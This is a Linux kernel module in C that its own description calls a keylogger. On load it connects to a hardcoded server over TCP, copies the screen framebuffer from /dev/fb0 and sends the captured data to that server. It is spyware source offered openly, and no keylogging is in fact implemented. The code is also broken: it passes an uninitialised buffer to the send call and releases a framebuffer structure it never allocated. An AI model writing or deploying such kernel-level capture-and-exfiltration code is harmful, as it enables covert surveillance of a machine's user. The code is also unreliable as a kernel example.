#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/keyboard.h>
#include <linux/socket.h>
#include <linux/net.h>
#include <linux/inet.h>
#include <linux/fb.h>
#include <linux/screen_info.h>
#include <linux/uaccess.h>

#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/sched.h>
#include <linux/screen_info.h>
#include <linux/fb.h>
#include <linux/vmalloc.h>
#include <linux/uaccess.h>

#include <linux/fs.h>
#include <linux/file.h>
#include <linux/fs_struct.h>
#include <linux/path.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Leonardo, Carlos Henrique, Henrique");
MODULE_DESCRIPTION("Keylogger with Socket and Framebuffer");

#define SERVER_IP "192.168.0.246"
#define SERVER_PORT 8032
#define BUFFER_SIZE 30
#define PATH "/home/lucas/Downloads/modulo/snapshot.bin"

char buffer[BUFFER_SIZE];


struct socket *sock;

// Estrutura para armazenar informações sobre o framebuffer
struct fbinfo {
    struct fb_var_screeninfo var_info;
    struct fb_fix_screeninfo fix_info;
    unsigned char *buffer;
};

// Função para tirar um snapshot da tela
void take_snapshot(void) {
    struct fb_info *fb_info;
    struct fbinfo *my_fbinfo;
    struct file *file;

    file = filp_open("/dev/fb0", O_RDONLY, 0);
    if (IS_ERR(file)) {
        printk(KERN_ALERT "filp_open error\n");
        return;
    }

    fb_info = file->private_data;

    // Aloque memória para armazenar informações sobre o framebuffer
    my_fbinfo = vmalloc(sizeof(struct fbinfo));
    if (!my_fbinfo) {
        printk(KERN_ERR "Erro ao alocar memória para fbinfo\n");
        framebuffer_release(fb_info);
        return;
    }

    // Copie as informações do framebuffer para a estrutura fbinfo
    my_fbinfo->var_info = fb_info->var;
    my_fbinfo->fix_info = fb_info->fix;

    // Aloque memória para armazenar o snapshot da tela
    my_fbinfo->buffer = vmalloc(my_fbinfo->fix_info.smem_len);
    if (!my_fbinfo->buffer) {
        printk(KERN_ERR "Erro ao alocar memória para o buffer do snapshot\n");
        vfree(my_fbinfo);
        framebuffer_release(fb_info);
        return;
    }

    // Copie o conteúdo do framebuffer para o buffer do snapshot
    memcpy(my_fbinfo->buffer, fb_info->screen_base, my_fbinfo->fix_info.smem_len);

    struct kvec vec[3];
    struct msghdr msg;


    vec[0].iov_base = (void *) &fb_info->var.xres;
    vec[0].iov_len = sizeof(fb_info->var.xres);


    vec[1].iov_base = (void *) &fb_info->var.yres;
    vec[1].iov_len = sizeof(fb_info->var.yres);
   

    memset(&msg, 0, sizeof(msg));
    msg.msg_name = NULL;
    msg.msg_namelen = 0;
    msg.msg_control = NULL;
    msg.msg_controllen = 0;
    msg.msg_flags = 0;

    
    int ret = kernel_sendmsg(sock, &msg, vec, 3, vec[0].iov_len + vec[1].iov_len);
    if (ret < 0) {
        printk(KERN_INFO "Failed to send video log to the server.\n");
        return;
    }

   
    vfree(my_fbinfo->buffer);
    vfree(my_fbinfo);
    framebuffer_release(fb_info);
}

static int __init start(void) {
    // Create a socket
    int ret = sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
    if (ret < 0) {
        printk(KERN_INFO "Can't create a socket.\n");
        return ret;
    }

    // Set up server address
    struct sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = in_aton(SERVER_IP);
    server_addr.sin_port = htons(SERVER_PORT);

    // Connect to the server
    ret = sock->ops->connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr), 0);
    if (ret < 0) {
        printk(KERN_INFO "Can't connect to the server.\n");
        sock_release(sock);
        return ret;
    }

    take_snapshot();

    return 0;
}

static void __exit end(void) {
    // Close the socket
    if (sock) {
        kernel_sock_shutdown(sock, SHUT_RDWR);
        sock_release(sock);
        sock = NULL;
    }

    printk(KERN_INFO "Video log stopped.\n");
}

module_init(start);
module_exit(end);
